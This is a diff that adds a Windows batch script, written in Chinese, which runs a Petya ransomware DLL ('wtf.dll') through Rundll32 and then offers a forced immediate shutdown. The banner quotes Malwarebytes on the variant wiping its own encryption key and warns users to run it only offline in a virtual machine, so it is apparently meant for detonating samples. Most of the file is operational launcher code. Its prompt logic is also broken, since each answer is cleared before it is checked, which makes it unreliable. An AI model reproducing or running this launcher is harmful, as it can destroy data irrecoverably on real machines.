@@ -1,0 +1,39 @@
+@echo off & echo. 
+echo.
+echo.
+echo.
+echo.          powered by RUNDLL32.EXE           
+echo.
+echo.
+echo.          PETYA.DLL     运行工具!!!         
+echo.
+echo.
+echo ______________________________________________
+echo 根据Malwarebytes Labs发现的信息，我们确定
+echo 这种ransomware变体被编码为擦除用于加密MFT（主文件
+echo 表）的唯一且随机生成的密钥。 Salsa20密钥的破坏使用户
+echo 不太可能获得能够工作解密密钥 - 即使在支付攻击者赎金要
+echo 求之后。因此，我们警告任何可能正在考虑支付赎金的受感染
+echo 用户要小心。
+echo.                             ---- Malwarebytes
+echo.                                  Blog
+echo. 警告：该病毒有极大的危害，请断网并上虚拟机！
+set /p switchofpetya=确定要运行吗？ (y/n（或任意键）)
+set switchofpetya=
+if /i \"%switchofpetya%\"==\"y\" goto rundll32
+exit
+:rundll32
+cls
+@echo on
+C:/Windows/System32/Rundll32.exe wtf.dll #1
+@echo off
+rem if ERRORLEVEL ==0 goto shutdownembed
+goto error
+:error
+echo 出错啦！回车键退出。<pause<nul
+:shutdownembed
+echo 如果上面Rundll32没有错误，Petya已经成功运行。
+set /p shutdown=是否关机？ (y/任何键)
+set shutdown=
+if /i \"%shutdown%\"==\"y\" shutdown /s /f /t 00
+exit
